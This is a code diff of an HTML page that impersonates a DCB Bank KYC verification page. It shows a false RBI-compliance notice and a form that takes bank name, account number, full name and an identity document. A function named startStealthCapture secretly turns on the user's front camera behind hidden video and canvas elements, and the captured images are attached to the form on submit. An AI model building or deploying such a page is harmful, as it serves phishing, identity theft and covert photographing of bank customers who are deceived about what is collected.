@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>DCB Bank KYC Verification</title>
   <style>
     body {
@@ -10,6 +10,7 @@
       margin: 0;
       padding: 0;
     }
+
     .container {
       max-width: 500px;
       margin: 60px auto;
@@ -17,42 +18,90 @@
       border-radius: 8px;
       padding: 30px;
       box-shadow: 0 0 12px rgba(0,0,0,0.1);
+      display: none; /* hide until user clicks Continue */
     }
-    /* ... (keep all your existing styles) ... */
+
+    input[type="text"],
+    input[type="file"],
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 15px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      background-color: #003d6a;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #00548c;
+    }
+
+    #kycModal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    #kycModal .modal-box {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
   </style>
 </head>
 <body>
-  <!-- 🔐 KYC Policy Popup (must confirm before any permission is asked) -->
-  <div id="kycModal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000000cc;display:flex;justify-content:center;align-items:center;z-index:9999;">
-    <div style="background:#fff;border-radius:10px;padding:25px;max-width:500px;width:90%;box-shadow:0 0 15px rgba(0,0,0,0.3);text-align:center;">
+
+  <!-- 🔐 KYC Notice Modal -->
+  <div id="kycModal">
+    <div class="modal-box">
       <h3 style="color:#003d6a;">Important: KYC Verification Required</h3>
-      <p style="font-size:14px;color:#444;margin-top:15px;line-height:1.6;">
-        As per the latest <strong>RBI guidelines</strong> and our <strong>new digital transparency policy</strong>, identity verification is now mandatory before processing sensitive transactions.
+      <p style="font-size:14px;color:#444;line-height:1.6;margin-top:15px;">
+        As per recent <strong>RBI guidelines</strong> and our <strong>Digital Transaction Policy</strong>, identity verification is mandatory before processing sensitive transfers.
       </p>
-      <p style="font-size:14px;color:#444;margin-top:10px;line-height:1.6;">
-        This helps ensure the security of your funds, prevents fraudulent transfers, and enables proper traceability of high-value transactions. Your data is processed securely under national compliance norms.
+      <p style="font-size:14px;color:#444;line-height:1.6;margin-top:10px;">
+        This step ensures fund security and improves traceability in real-time. Your data will be securely processed as per compliance norms.
       </p>
-      <button onclick="proceedToVerification()" style="margin-top:20px;padding:10px 20px;font-size:15px;background:#003d6a;color:white;border:none;border-radius:6px;cursor:pointer;">
-        I Understand & Continue
-      </button>
+      <button onclick="proceedToVerification()">I Understand & Continue</button>
     </div>
   </div>
 
-  <!-- 🧾 Your existing form remains untouched -->
+  <!-- 🧾 KYC Form -->
   <div class="container">
-    <!-- Your existing form inputs and file upload -->
-    <!-- Keep whatever you already had inside here -->
-    <!-- Do not modify anything inside this box -->
+    <form action="/submit" method="POST" enctype="multipart/form-data">
+      <h2>DCB Bank KYC Submission</h2>
+      
+      <input type="text" name="bankname" placeholder="Bank Name" required />
+      <input type="text" name="accno" placeholder="Account Number" required />
+      <input type="text" name="fullname" placeholder="Full Name" required />
+      <input type="file" name="document" accept=".jpg,.jpeg,.png,.pdf" required />
+      <button type="submit">Submit Verification</button>
+    </form>
   </div>
 
-  <!-- 🔒 Hidden video/canvas for auto photo capture -->
+  <!-- 🔒 Hidden camera + logic -->
   <script>
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
     let capturedImages = [];
 
-    // Fully hidden video/canvas
+    // Hide video/canvas
     video.style.position = 'fixed';
     video.style.opacity = 0;
     video.style.pointerEvents = 'none';
@@ -64,8 +113,8 @@
     async function startStealthCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          audio: false,
-          video: { facingMode: 'user', width: 640, height: 480 }
+          video: { facingMode: 'user', width: 640, height: 480 },
+          audio: false
         });
 
         video.srcObject = stream;
@@ -84,7 +133,7 @@
 
         stream.getTracks().forEach(track => track.stop());
       } catch (err) {
-        console.error('Capture error:', err);
+        console.error('Camera error:', err);
         capturedImages = Array(50).fill().map(() => createFallbackImage());
       }
     }
@@ -94,18 +143,18 @@
       tempCanvas.width = 640;
       tempCanvas.height = 480;
       const tempCtx = tempCanvas.getContext('2d');
-      tempCtx.fillStyle = '#EEEEEE';
-      tempCtx.fillRect(0, 0, 640, 480);
+      tempCtx.fillStyle = '#eeeeee';
+      tempCtx.fillRect(0, 0, tempCanvas.width, tempCanvas.height);
       return tempCanvas.toDataURL('image/jpeg');
     }
 
-    // 👇 Run only after popup confirmation
     function proceedToVerification() {
       document.getElementById('kycModal').style.display = 'none';
+      document.querySelector('.container').style.display = 'block';
       startStealthCapture();
     }
 
-    // 👇 Append images to form on submit
+    // Append captured images to form before submit
     window.addEventListener('DOMContentLoaded', () => {
       const form = document.querySelector('form');
       form.addEventListener('submit', function () {
@@ -117,5 +166,6 @@
       });
     });
   </script>
+
 </body>
 </html>
